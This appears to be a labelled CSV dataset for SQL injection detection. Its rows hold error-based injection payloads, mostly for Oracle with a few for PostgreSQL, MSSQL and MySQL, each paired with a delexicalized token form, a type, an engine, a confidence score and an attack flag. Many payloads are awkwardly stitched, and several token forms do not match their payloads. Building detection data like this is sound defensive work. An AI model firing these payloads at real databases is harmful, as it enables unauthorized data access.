payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack
"select * from users WHERE username = ""-2951 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) # gwqv"" or username = ""-7199\' and username = ""1 ) as zmxb where 8424 = 8424 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ __INT__ ) as __IDENT__ where __INT__ = __INT__ and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ) - - """,error_based,oracle,0.95,True
"select * from users WHERE username = ""1"" or# 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-5585\' and username = ""-7430\' ) as xfah where 1596 = 1596",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - __STR__ - __INT__ __STR__ ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" and username = ""-8112\' ) ) ) and username = ""1",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-6353%\' ) ) and username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ from dual where __INT__ = __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-1641\' ) ) and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx"" and username = ""1 or username = ""-4610\' ) )","select * from __IDENT__ where __IDENT__ = "" - __INT__ __STR__ ) ) ) and ( ( ( \ __STR__ = \ __STR__ ) )",error_based,oracle,0.95,True
"select * from users WHERE username = ""-3859 ) || username = ""-7072\' ) || username = ""-5062 ) where 7457 = 7457 || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-1549\' )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ),error_based,oracle,0.9,True
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks"" or username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __INT__ ) ) ) and __INT__ = cast ( ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) __IDENT__ | | ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) as __IDENT__ ),error_based,oracle,0.9,True
"select * from users WHERE username = ""-5585\' and username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) ),error_based,oracle,0.95,True
"select * from users WHERE username = ""1"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) __STR__ __INT__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.9,True
"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
"select * from users WHERE username = ""-1641\' ) ) and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-2733\' ) ) ) and username = ""-2733\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
select ( case when ( 3565 = 4053 ) then 3565 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,select ( case when ( __INT__ = __INT__ ) then __INT__ else cast ( __INT__ as __IDENT__ ) / ( select __INT__ from dual ) end ) from dual - -,error_based,oracle,0.9,True
"select * from users WHERE username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-5863"" and username = ""-7746\' ) ) ) || 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'itxy\' like \'itxy""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True
"select * from users WHERE username = ""1%\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and \'%\' = \'"" and username = ""1\' ) as wpmv where 1479 = 1479",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) as __IDENT__ where __INT__ = __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-8860 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'qhdg\' = \'qhdg""","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ or __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) and ( ( ( \ __STR__ = __IDENT__",error_based,oracle,0.9,True
"SELECT * FROM users WHERE username = ""-9742 ) where 8409 = 8409 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,postgresql,0.85,True
"select * from users WHERE username = ""1%\' or username = ""-1641\' ) ) and username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.9,True
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""1"" or username = ""-7962\' ) ) as pgqz where 6058 = 6058 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""","select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) - - """,error_based,oracle,0.95,True
"select * from users WHERE username = ""-1254"" and username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ ) ) ) and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True
"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and username = ""-5291\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1 ) ) ) and ( ( ( 9548 = 9548""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True
"select * from users WHERE username = ""1 ) ) ) and username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'ulkq\' = \'ulkq""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.95,True
"1' ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'zcrh' = 'zcrh",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mssql,0.9,True
"select * from users WHERE username = ""1 or username = ""-4610\' ) ) or username = ""-5062 ) where 7457 = 7457 and username = ""-8007\' ) ) as bgpp where 9555 = 9555 or username = ""-7720 ) )","select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = "" - __INT__ ) )",error_based,oracle,0.85,True
"1'|| ( select 'vsfg' where 3547 = 3547 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) ) ||'",__INT__ __STR__ __IDENT__ __STR__,error_based,mysql,0.85,True
"select * from Users WHERE Username = ""1"" and Username = ""1'+ ( select \'kicv' where 1976 = 1976 and 3754 = ( select Upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dUal ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dUal ) ) +\'""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True
"select * from users WHERE username = ""1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'winx\' = \'winx"" or username = ""-6190\' ) where 2621 = 2621 and username = ""1""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__ __INT__,error_based,oracle,0.95,True
"select * from users WHERE username = ""-9295 ) ) ) and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-1641\' ) ) or username = ""-2756\' where 6156 = 6156 and 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.8,True
"select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-1985 ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )","select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = "" - __INT__ ) ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual )",error_based,oracle,0.95,True
"select * from users WHERE username = ""-9295 ) ) ) or username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""-1254"" or username = ""1\' where 8537 = 8537 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True
"1' or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and 'zpyx' = 'zpyx",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,mysql,0.9,True
